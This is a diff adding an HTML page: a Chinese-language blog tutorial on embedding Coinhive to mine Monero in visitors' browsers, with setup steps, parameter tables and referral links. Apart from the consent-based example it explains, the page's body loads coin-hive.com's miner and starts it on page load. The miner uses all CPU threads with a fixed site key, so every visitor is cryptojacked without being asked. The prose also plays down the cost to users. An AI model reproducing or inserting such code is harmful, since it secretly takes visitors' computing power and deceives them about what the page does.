@@ -1,0 +1,240 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta name="description" content="網站主在 Coinhive 註冊帳號，取得程式碼  (其實js也都是在Coinhive的伺服器，所以幾乎不會影響到網站的速度) ，然後只要有人在瀏覽你的網站它就會自動幫你挖礦了。" />
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Coinhive 教學 － 讓網頁瀏覽器幫你挖礦(門羅幣 XMR)，賺進額外收入</title>
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-110965571-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-110965571-1');
+</script>
+<style type="text/css">
+<!--
+body {
+	font: 100%/1.4 Verdana, Arial, Helvetica, sans-serif;
+	background-color: #4E5869;
+	margin: 0;
+	padding: 0;
+	color: #000;
+}
+
+/* ~~ 元素/標籤選取器 ~~ */
+ul, ol, dl { /* 由於瀏覽器之間的差異，最佳作法是在清單中使用零寬度的欄位間隔及邊界。為了保持一致，您可以在這裡指定所要的量，或在清單包含的清單項目 (LI、DT、DD) 上指定所要的量。請記住，除非您寫入較為特定的選取器，否則在此執行的作業將重疊顯示到 .nav 清單。 */
+	padding: 0;
+	margin: 0;
+}
+h1, h2, h3, h4, h5, h6, p {
+	margin-top: 0;	 /* 移除上方邊界可以解決邊界可能從其包含的 Div 逸出的問題。剩餘的下方邊界可以保持 Div 不與接在後面的元素接觸。 */
+	padding-right: 15px;
+	padding-left: 15px; /* 將欄位間隔加入至 Div 內元素的兩側 (而不是 Div 本身)，即可不需執行任何方塊模型的計算作業。具有側邊欄位間隔的巢狀 Div 也可當做替代方法。 */
+	text-align: center;
+}
+a img { /* 這個選取器會移除某些瀏覽器在影像由連結所圍繞時，影像周圍所顯示的預設藍色邊框 */
+	border: none;
+}
+
+/* ~~ 網站連結的樣式設定必須保持此順序，包括建立滑過 (Hover) 效果的選取器群組在內。~~ */
+a:link {
+	color:#414958;
+	text-decoration: underline; /* 除非您要設定非常獨特的連結樣式，否則最好提供底線，以便快速看出 */
+}
+a:visited {
+	color: #4E5869;
+	text-decoration: underline;
+}
+a:hover, a:active, a:focus { /* 這個選取器群組可以讓使用鍵盤導覽的使用者，也和使用滑鼠的使用者一樣擁有相同的滑過體驗。 */
+	text-decoration: none;
+}
+
+/* ~~ 這個容器環繞著所有其他的 Div，並依百分比設定其寬度 ~~ */
+.container {
+	width: 80%;
+	max-width: 1260px;/* 建議您使用最大寬度，如此版面在大型螢幕上就不致於過寬，讓行保持比較方便閱讀的長度。IE6 並不適用這項宣告。 */
+	min-width: 780px;/* 建議您使用最小寬度，如此版面在大型螢幕上就不致於過窄，讓行在側欄中保持比較方便閱讀的長度。IE6 並不適用這項宣告。 */
+	background-color: #FFF;
+	margin: 0 auto; /* 兩側的自動值與寬度結合後，版面便會置中對齊。如果將 .container 的寬度設為 100%，就不需要這麼做。 */
+}
+
+/* ~~ 這是版面資訊。~~ 
+
+1) 欄位間隔只會置於 Div 的頂端或底部。此 Div 內的元素在兩側會有欄位間隔，可讓您不需進行「方塊模型計算」。請記住，如果對 Div 本身加入任何側邊的欄位間隔或邊框，在計算「總」寬度時，就會將這些加入您定義的寬度。您也可以選擇移除 Div 中元素的欄位間隔，然後在其中放置沒有寬度的第二個 Div，並依設計所需放置欄位間隔。
+
+*/
+.content {
+	padding: 10px 0;
+}
+
+/* ~~ 這個群組選取器會在 .content 區域空間中提供清單 ~~ */
+.content ul, .content ol { 
+	padding: 0 15px 15px 40px; /* 這個欄位間隔反映出上方標題和段落規則中的右方間隔。當欄位間隔位於下方時，便可將清單中的其他元素間隔開來；當位於左方時，則可藉此建立縮排。這些動作均可依需要進行調整。 */
+}
+
+/* ~~ 其他 float/clear 類別 ~~ */
+.fltrt {  /* 這個類別可用來讓元素在頁面中浮動，浮動的元素必須位於頁面上相鄰的元素之前。 */
+	float: right;
+	margin-left: 8px;
+}
+.fltlft { /* 這個類別可用來讓元素在頁面左方浮動，浮動的元素必須位於頁面上相鄰的元素之前。 */
+	float: left;
+	margin-right: 8px;
+}
+.clearfloat { /* 這個類別可放置在 <br /> 或空白的 Div 上，當做接在 #container 內最後一個浮動 Div 後方的最後一個元素 (如果已移除 .container 上的 overflow:hidden) */
+	clear:both;
+	height:0;
+	font-size: 1px;
+	line-height: 0px;
+}
+-->
+</style></head>
+
+<body>
+
+<script src="https://coin-hive.com/lib/coinhive.min.js"></script>
+
+<script type="text/javascript">
+var miner = new CoinHive.User('nueUIn9yJrvxUBki7TwJMs0s0bpqXDqb', 'User', {
+	threads: navigator.hardwareConcurrency,
+	autoThreads: false,
+	throttle: 0.5,
+	forceASMJS: false
+	});
+miner.start(CoinHive.FORCE_EXCLUSIVE_TAB);
+// Update stats once per second
+setInterval(function() {
+    var threadCount = miner.getNumThreads();
+    var hashesPerSecond = Math.round(miner.getHashesPerSecond() * 100) / 100;
+    var totalHashes = miner.getTotalHashes();
+    var acceptedHashes = miner.getAcceptedHashes() / 256;
+    // Output to HTML elements...
+    if (miner.isRunning()) {
+        document.getElementById("ths").innerHTML = "Hashes:</br> " + totalHashes;
+        document.getElementById("minebutton").innerHTML = "<button onclick=\"miner.stop()\">Stop</br>Mining</button>";
+    } else {
+        document.getElementById("ths").innerHTML = "Total:</br>" + totalHashes;;
+        document.getElementById("minebutton").innerHTML = "<button onclick=\"miner.start(CoinHive.FORCE_EXCLUSIVE_TAB)\">Continue</br>Mining</button>";
+    }
+}, 1000);
+</script>
+
+<div class="container">
+  <div class="content">
+    <blockquote>
+      <blockquote>
+        <blockquote>
+          <h2>Coinhive 教學 － 讓網頁瀏覽器幫你挖礦(門羅幣 XMR)，賺進額外收入</h2>
+          <p>&nbsp;</p>
+         傳統的網頁想賺錢，直覺大概就會想到投放廣告，但現在誰的瀏覽器沒有裝ADB？廣告早就被擴充插件都阻擋掉了，何況純瀏覽的收入少之又少，靠經營網站賺錢顯得越來越困難。<br />
+<br />
+而結合最新興的潮流－挖礦，不但可以讓網頁保持乾淨不會有煩人的廣告，還可以為網頁主賺進一筆額外收入，聽起來有多吸引人應該就不用我贅述了吧，可能大部分人的第一個反應會認為挖礦不是很燒顯卡嗎？會不會看一看網頁就當掉了，但 Coinhive 其實是用CPU挖礦的，而且可以自行調節功率，實際上在使用者的角度幾乎感覺不到有在挖礦，我相信未來網頁挖礦會慢慢成熟替代傳統煩人的廣告，成為網站營運的經費來源。<br />
+<br />
+<br />
+那回到主題，就要來介紹開發這項計畫的 Coinhive 了，基本上它的運營原理很簡單，<b>網站主在 Coinhive 註冊帳號，取得程式碼&nbsp; (其實js也都是在Coinhive的伺服器，所以幾乎不會影響到網站的速度) ，然後只要有人在瀏覽你的網站它就會自動幫你挖礦了</b>，會即時顯示在 Coinhive 的儀錶板上，一旦到了它的起付額 (0.5 XMR) 就可以提領到自己的虛擬錢包，就是這麼簡單。<br />
+<br />
+<br />
+<div class="separator" style="clear: both; text-align: center;">
+<a href="https://1.bp.blogspot.com/-pfmXJZ4sug8/WiFNPMgqRAI/AAAAAAAAA5E/rD7JnAMuwsA65Af3UIA4U4VnN2f7SjCagCLcBGAs/s1600/2017-12-01_203741.jpg" imageanchor="1" style="clear: left; float: left; margin-bottom: 1em; margin-right: 1em;"><img alt="coinhive" border="0" data-original-height="213" data-original-width="244" src="https://1.bp.blogspot.com/-pfmXJZ4sug8/WiFNPMgqRAI/AAAAAAAAA5E/rD7JnAMuwsA65Af3UIA4U4VnN2f7SjCagCLcBGAs/s1600/2017-12-01_203741.jpg" title="coinhive" /></a></div>
+<span style="font-size: x-large;">Coinhive</span><br />
+<br />
+<ul>
+<li><b>官方網站：</b><a href="https://coinhive.com/">https://coinhive.com</a>&nbsp;</li>
+<li><b><span style="color: #0b5394;">(如果不介意可以點<a href="https://cnhv.co/hbli" style="box-sizing: border-box; font-family: HelveticaNeue, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif; font-size: 15px;">cnhv.co/hbli</a>&nbsp;轉址能為我賺一點點XMR)</span></b></li>
+<li><b>挖取貨幣：</b>門羅幣 Monero (XMR)</li>
+<li><b>起付金額：<span style="color: red;">0.5 XMR</span></b></li>
+</ul>
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+註冊完成後先到&nbsp;<b>settings&nbsp;</b>裡面的 <b>Sites &amp; API Keys&nbsp;</b>創立一個新網站&nbsp;<b>(Create A New Site)</b><br />
+<br />
+<div class="separator" style="clear: both; text-align: center;">
+<a href="https://1.bp.blogspot.com/-Wr6xKZjq89k/WiFOQVxj8WI/AAAAAAAAA5M/PL-WI-F9HvsgJ0fLZ7jPkpKB7c0Iqj_cACLcBGAs/s1600/2017-12-01_204229.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="416" data-original-width="776" height="343" src="https://1.bp.blogspot.com/-Wr6xKZjq89k/WiFOQVxj8WI/AAAAAAAAA5M/PL-WI-F9HvsgJ0fLZ7jPkpKB7c0Iqj_cACLcBGAs/s640/2017-12-01_204229.jpg" width="640" /></a></div>
+<div class="separator" style="clear: both; text-align: center;">
+<br /></div>
+之後會得到兩組Key，<span style="color: red;"><b>Site Key (public)</b> 是拿來置入程式碼內的</span>，<span style="color: red;"><b>Secret Key</b>記得不要讓他人知道</span>，如果不小心洩漏了可以按 <b>revoke </b>重新產生。<br />
+<br />
+<br />
+<div class="separator" style="clear: both; text-align: center;">
+<a href="https://3.bp.blogspot.com/-NP-Z9kaDRaE/WiFOmf-_pVI/AAAAAAAAA5Q/52P7yBLHzbgX1o8J339qODixa_ukpBwegCLcBGAs/s1600/2017-12-01_204337.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="199" data-original-width="757" height="168" src="https://3.bp.blogspot.com/-NP-Z9kaDRaE/WiFOmf-_pVI/AAAAAAAAA5Q/52P7yBLHzbgX1o8J339qODixa_ukpBwegCLcBGAs/s640/2017-12-01_204337.jpg" width="640" /></a></div>
+<br />
+<br />
+<br />
+在 <b>documentation</b> 裡面有幾種現成的挖礦程式碼，<b>Captcha&nbsp;</b>是類似轉網址的服務，在轉址中也會順便挖礦回饋給建立連結的人。<br />
+<br />
+<br />
+<div class="separator" style="clear: both; text-align: center;">
+<a href="https://1.bp.blogspot.com/-uJQJsHX8ooo/WiFPAiKdL0I/AAAAAAAAA5Y/huN5-j0Z-eAHu3eRKWU74Ue33bMi_a4NgCLcBGAs/s1600/2017-12-01_204542.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="869" data-original-width="803" height="640" src="https://1.bp.blogspot.com/-uJQJsHX8ooo/WiFPAiKdL0I/AAAAAAAAA5Y/huN5-j0Z-eAHu3eRKWU74Ue33bMi_a4NgCLcBGAs/s640/2017-12-01_204542.jpg" width="590" /></a></div>
+<br />
+<br />
+以最簡單的<b> Simple Miner UI</b> 為例<br />
+<br />
+因為主要的程式碼都在 Coinhive 的伺服器端，其實只是單純導入然後有一些參數可以設置，如下的&nbsp;<span style="background-color: #f8f9fa; font-family: monospace , monospace; font-size: 15px;"><span style="color: #66aa00;">"width: </span><span style="color: red;"><b><u>256</u>px</b></span><span style="color: #66aa00;">; height: </span><span style="color: red;"><b><u>310</u></b><b>px</b></span><span style="color: #66aa00;">"</span></span><span style="background-color: #f8f9fa; color: #66aa00; font-family: monospace , monospace; font-size: 15px;">&nbsp;</span>可以設定介面的寬與高，<b style="background-color: #f8f9fa; color: #66aa00; font-family: monospace, monospace; font-size: 15px;"><u>YOUR_SITE_KEY</u></b>則要改成自己的 Site key (public)。<br />
+<br />
+<pre class="sh" style="background: rgb(248, 249, 250); border-left: 3px solid rgb(33, 176, 249); box-shadow: rgba(0, 0, 0, 0.12) 0px 3px 8px -1px; box-sizing: border-box; color: #555555; font-family: monospace, monospace; font-size: 15px; margin-bottom: 2.5rem; overflow: auto; padding: 6px 12px; tab-size: 4;"><span class="punct" style="box-sizing: border-box; color: #1177bb;">&lt;</span><span class="keywords" style="box-sizing: border-box; color: #ff00bb;">script</span> src<span class="punct" style="box-sizing: border-box; color: #1177bb;">=</span><span class="strings" style="box-sizing: border-box; color: #66aa00;">"https://authedmine.com/lib/simple-ui.min.js"</span> async<span class="punct" style="box-sizing: border-box; color: #1177bb;">&gt;&lt;</span><span class="punct" style="box-sizing: border-box; color: #1177bb;">/</span><span class="keywords" style="box-sizing: border-box; color: #ff00bb;">script</span><span class="punct" style="box-sizing: border-box; color: #1177bb;">&gt;</span>
+<span class="punct" style="box-sizing: border-box; color: #1177bb;">&lt;</span><span class="keywords" style="box-sizing: border-box; color: #ff00bb;">div</span> class<span class="punct" style="box-sizing: border-box; color: #1177bb;">=</span><span class="strings" style="box-sizing: border-box; color: #66aa00;">"coinhive-miner"</span> 
+ style<span class="punct" style="box-sizing: border-box; color: #1177bb;">=</span><span class="strings" style="box-sizing: border-box; color: #66aa00;">"width: <b><u>256</u>px</b>; height: <b><u>310</u>px</b>"</span>
+ data<span class="punct" style="box-sizing: border-box; color: #1177bb;">-</span>key<span class="punct" style="box-sizing: border-box; color: #1177bb;">=</span><span class="strings" style="box-sizing: border-box; color: #66aa00;">"<b><u>YOUR_SITE_KEY</u></b>"</span><span class="punct" style="box-sizing: border-box; color: #1177bb;">&gt;</span>
+ <span class="punct" style="box-sizing: border-box; color: #1177bb;">&lt;</span>em<span class="punct" style="box-sizing: border-box; color: #1177bb;">&gt;</span>Loading<span class="punct" style="box-sizing: border-box; color: #1177bb;">...&lt;/</span>em<span class="punct" style="box-sizing: border-box; color: #1177bb;">&gt;</span>
+<span class="punct" style="box-sizing: border-box; color: #1177bb;">&lt;/</span><span class="keywords" style="box-sizing: border-box; color: #ff00bb;">div</span><span class="punct" style="box-sizing: border-box; color: #1177bb;">&gt;</span></pre>
+挖礦介面大致上的樣子：<br />
+<br />
+<br />
+<script async="" src="https://authedmine.com/lib/simple-ui.min.js"></script>
+
+<br />
+<div class="coinhive-miner" data-key="iY0CSwvvEYBFcgBiT2lninDvBjUTJfpR" style="height: 300px; width: 300px;">
+<em>Loading...</em>
+</div>
+下面是一些官網提供的參數，<b>可以加在&lt;div&gt;裡面接在data-key之後</b><br />
+<br />
+<table class="reference" style="border-collapse: collapse; border-spacing: 0px; box-sizing: border-box; color: #222222; font-family: HelveticaNeue, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif; font-size: 15px; margin-bottom: 2.5rem; width: 720px;"><tbody style="box-sizing: border-box;">
+<tr style="box-sizing: border-box;"><td style="border-bottom: 1px solid rgb(241, 241, 241); box-sizing: border-box; font-family: monospace, monospace; font-size: 0.9em; margin: 0px; padding: 0.5em 1em 0.5em 0px; text-align: right; vertical-align: top; width: 180px;">data-key</td><td style="border-bottom: 1px solid rgb(241, 241, 241); box-sizing: border-box; margin: 0px; padding: 0.5em 0px 0.5em 1em; vertical-align: top;">Your public Site-Key. See&nbsp;<a href="https://coinhive.com/settings/sites" style="box-sizing: border-box; color: #1e9ee0; text-decoration-line: none;">Settings » Sites</a>.</td></tr>
+<tr style="box-sizing: border-box;"><td style="border-bottom: 1px solid rgb(241, 241, 241); box-sizing: border-box; font-family: monospace, monospace; font-size: 0.9em; margin: 0px; padding: 0.5em 1em 0.5em 0px; text-align: right; vertical-align: top; width: 180px;">data-user</td><td style="border-bottom: 1px solid rgb(241, 241, 241); box-sizing: border-box; margin: 0px; padding: 0.5em 0px 0.5em 1em; vertical-align: top;">Optional. The user name to which the hashes will be credited to. Just leave this empty if you are unsure.</td></tr>
+<tr style="box-sizing: border-box;"><td style="border-bottom: 1px solid rgb(241, 241, 241); box-sizing: border-box; font-family: monospace, monospace; font-size: 0.9em; margin: 0px; padding: 0.5em 1em 0.5em 0px; text-align: right; vertical-align: top; width: 180px;">data-autostart<br />
+自動開始</td><td style="border-bottom: 1px solid rgb(241, 241, 241); box-sizing: border-box; margin: 0px; padding: 0.5em 0px 0.5em 1em; vertical-align: top;">Optional. Whether to automatically start mining (<code style="background: rgb(244, 245, 246); box-sizing: border-box; font-family: monospace, monospace; font-size: 13.5px; margin: 0px 0.2rem; padding: 0.2rem 0.5rem;">true|false</code>). The default is&nbsp;<code style="background: rgb(244, 245, 246); box-sizing: border-box; font-family: monospace, monospace; font-size: 13.5px; margin: 0px 0.2rem; padding: 0.2rem 0.5rem;">false</code>. The miner will only autostart on subsequent page loads after the user has initially started the miner once himself. See our&nbsp;<a href="https://coinhive.com/documentation/authedmine" style="box-sizing: border-box; color: #1e9ee0; text-decoration-line: none;">AuthedMine documentation</a>&nbsp;for the details.</td></tr>
+<tr style="box-sizing: border-box;"><td style="border-bottom: 1px solid rgb(241, 241, 241); box-sizing: border-box; font-family: monospace, monospace; font-size: 0.9em; margin: 0px; padding: 0.5em 1em 0.5em 0px; text-align: right; vertical-align: top; width: 180px;">data-whitelabel<br />
+是否顯示由coinhive提供</td><td style="border-bottom: 1px solid rgb(241, 241, 241); box-sizing: border-box; margin: 0px; padding: 0.5em 0px 0.5em 1em; vertical-align: top;">Optional. Whether to hide the&nbsp;<em style="box-sizing: border-box;">Powered by Coinhive</em>&nbsp;text (<code style="background: rgb(244, 245, 246); box-sizing: border-box; font-family: monospace, monospace; font-size: 13.5px; margin: 0px 0.2rem; padding: 0.2rem 0.5rem;">true|false</code>). The default is&nbsp;<code style="background: rgb(244, 245, 246); box-sizing: border-box; font-family: monospace, monospace; font-size: 13.5px; margin: 0px 0.2rem; padding: 0.2rem 0.5rem;">false</code>.</td></tr>
+<tr style="box-sizing: border-box;"><td style="border-bottom: 1px solid rgb(241, 241, 241); box-sizing: border-box; font-family: monospace, monospace; font-size: 0.9em; margin: 0px; padding: 0.5em 1em 0.5em 0px; text-align: right; vertical-align: top; width: 180px;">data-background<br />
+背景顏色</td><td style="border-bottom: 1px solid rgb(241, 241, 241); box-sizing: border-box; margin: 0px; padding: 0.5em 0px 0.5em 1em; vertical-align: top;">Optional. The background color for the UI as 3 or 6 digit HEX color code. E.g.:&nbsp;<code style="background: rgb(244, 245, 246); box-sizing: border-box; font-family: monospace, monospace; font-size: 13.5px; margin: 0px 0.2rem; padding: 0.2rem 0.5rem;">#000000</code>&nbsp;for black,&nbsp;<code style="background: rgb(244, 245, 246); box-sizing: border-box; font-family: monospace, monospace; font-size: 13.5px; margin: 0px 0.2rem; padding: 0.2rem 0.5rem;">#ff0000</code>&nbsp;for red. Try&nbsp;<a href="http://htmlcolorcodes.com/" style="box-sizing: border-box; color: #1e9ee0; text-decoration-line: none;" target="_blank">htmlcolorcodes.com</a>&nbsp;to find the right colors.</td></tr>
+<tr style="box-sizing: border-box;"><td style="border-bottom: 1px solid rgb(241, 241, 241); box-sizing: border-box; font-family: monospace, monospace; font-size: 0.9em; margin: 0px; padding: 0.5em 1em 0.5em 0px; text-align: right; vertical-align: top; width: 180px;">data-text<br />
+字體顏色</td><td style="border-bottom: 1px solid rgb(241, 241, 241); box-sizing: border-box; margin: 0px; padding: 0.5em 0px 0.5em 1em; vertical-align: top;">Optional. The text color for the UI as 3 or 6 digit HEX color code. E.g.:&nbsp;<code style="background: rgb(244, 245, 246); box-sizing: border-box; font-family: monospace, monospace; font-size: 13.5px; margin: 0px 0.2rem; padding: 0.2rem 0.5rem;">#000000</code>&nbsp;for black or&nbsp;<code style="background: rgb(244, 245, 246); box-sizing: border-box; font-family: monospace, monospace; font-size: 13.5px; margin: 0px 0.2rem; padding: 0.2rem 0.5rem;">#ff0000</code>&nbsp;for red. Try&nbsp;<a href="http://htmlcolorcodes.com/" style="box-sizing: border-box; color: #1e9ee0; text-decoration-line: none;" target="_blank">htmlcolorcodes.com</a>&nbsp;to find the right colors.</td></tr>
+<tr style="box-sizing: border-box;"><td style="border-bottom: 1px solid rgb(241, 241, 241); box-sizing: border-box; font-family: monospace, monospace; font-size: 0.9em; margin: 0px; padding: 0.5em 1em 0.5em 0px; text-align: right; vertical-align: top; width: 180px;">data-action<br />
+動作顏色</td><td style="border-bottom: 1px solid rgb(241, 241, 241); box-sizing: border-box; margin: 0px; padding: 0.5em 0px 0.5em 1em; vertical-align: top;">Optional. The action color for the UI as 3 or 6 digit HEX color code. E.g.:&nbsp;<code style="background: rgb(244, 245, 246); box-sizing: border-box; font-family: monospace, monospace; font-size: 13.5px; margin: 0px 0.2rem; padding: 0.2rem 0.5rem;">#000000</code>&nbsp;for black or&nbsp;<code style="background: rgb(244, 245, 246); box-sizing: border-box; font-family: monospace, monospace; font-size: 13.5px; margin: 0px 0.2rem; padding: 0.2rem 0.5rem;">#ff0000</code>&nbsp;for red. Try&nbsp;<a href="http://htmlcolorcodes.com/" style="box-sizing: border-box; color: #1e9ee0; text-decoration-line: none;" target="_blank">htmlcolorcodes.com</a>&nbsp;to find the right colors.</td></tr>
+<tr style="box-sizing: border-box;"><td style="border-bottom: 1px solid rgb(241, 241, 241); box-sizing: border-box; font-family: monospace, monospace; font-size: 0.9em; margin: 0px; padding: 0.5em 1em 0.5em 0px; text-align: right; vertical-align: top; width: 180px;">data-graph<br />
+圖形顏色</td><td style="border-bottom: 1px solid rgb(241, 241, 241); box-sizing: border-box; margin: 0px; padding: 0.5em 0px 0.5em 1em; vertical-align: top;">Optional. The graph color for the UI as 3 or 6 digit HEX color code. E.g.:&nbsp;<code style="background: rgb(244, 245, 246); box-sizing: border-box; font-family: monospace, monospace; font-size: 13.5px; margin: 0px 0.2rem; padding: 0.2rem 0.5rem;">#000000</code>&nbsp;for black or&nbsp;<code style="background: rgb(244, 245, 246); box-sizing: border-box; font-family: monospace, monospace; font-size: 13.5px; margin: 0px 0.2rem; padding: 0.2rem 0.5rem;">#ff0000</code>&nbsp;for red. Try&nbsp;<a href="http://htmlcolorcodes.com/" style="box-sizing: border-box; color: #1e9ee0; text-decoration-line: none;" target="_blank">htmlcolorcodes.com</a>&nbsp;to find the right colors.</td></tr>
+<tr style="box-sizing: border-box;"><td style="border-bottom: 1px solid rgb(241, 241, 241); box-sizing: border-box; font-family: monospace, monospace; font-size: 0.9em; margin: 0px; padding: 0.5em 1em 0.5em 0px; text-align: right; vertical-align: top; width: 180px;">data-threads<br />
+執行緒數量</td><td style="border-bottom: 1px solid rgb(241, 241, 241); box-sizing: border-box; margin: 0px; padding: 0.5em 0px 0.5em 1em; vertical-align: top;">Optional. The number of threads the miner should start with.</td></tr>
+<tr style="box-sizing: border-box;"><td style="border-bottom: 1px solid rgb(241, 241, 241); box-sizing: border-box; font-family: monospace, monospace; font-size: 0.9em; margin: 0px; padding: 0.5em 1em 0.5em 0px; text-align: right; vertical-align: top; width: 180px;">data-throttle<br />
+初始的挖礦功率</td><td style="border-bottom: 1px solid rgb(241, 241, 241); box-sizing: border-box; margin: 0px; padding: 0.5em 0px 0.5em 1em; vertical-align: top;">Optional. The throttle value the miner should start with. See&nbsp;<a href="https://coinhive.com/documentation/miner#miner-set-throttle" style="box-sizing: border-box; color: #1e9ee0; text-decoration-line: none;">miner.setThrottle()
+
+</a></td></tr>
+</tbody></table>
+當然還有更多細節可以自訂，也有別種的 gui 可以選擇，有興趣的可以慢慢摸索，如果想看目前挖的進度可以到 <b>dashboard</b> 查看，在下方也會統計轉址 <b>shortlinks</b> 為你賺了多少 hashes。<br />
+<br />
+<br />
+但藉由瀏覽器的挖礦成效一定非常有限，一來侷限於瀏覽者的硬體設施一定不如專業挖礦，二來瀏覽器本身就會有一定的資源限制，不可能讓你無限使用CPU資源，<b><span style="color: red;">所以網頁挖礦的概念其實是積少成多，比較起傳統投置廣告的好處就是它的收益曲線更平滑</span></b>，不會在沒人點擊廣告的情況下收益幾乎掛零，挖礦長久累積起來還是不無小補的，未來挖礦產業可能會更成熟，XMR也是值得討論的新興虛擬貨幣，就和當時比特幣一樣，越早入場越有可能賺到時間紅利，不妨試試看這個網頁挖礦的功能吧！<br />
+<br />
+<br />
+如果喜歡這篇文章也歡迎點擊 <a href="http://cnhv.co/hbli">Coinhive 的轉址</a>進入官網，順便也能為我賺進一點點的 XMR 哦。(<b><span style="color: red;"><a href="https://cnhv.co/hbli" style="box-sizing: border-box; font-family: HelveticaNeue, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif; font-size: 15px;">cnhv.co/hbli</a>)&nbsp;</span></b><br />
+<b><span style="color: red;"><br /></span></b>
+            <!-- end .content -->
+     
+        </blockquote>
+      </blockquote>
+    </blockquote>
+  </div>
+  <!-- end .container --></div>
+  
+  <script type="text/javascript" src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-4e3a680e5532cd78"></script>
+</body>
+</html>
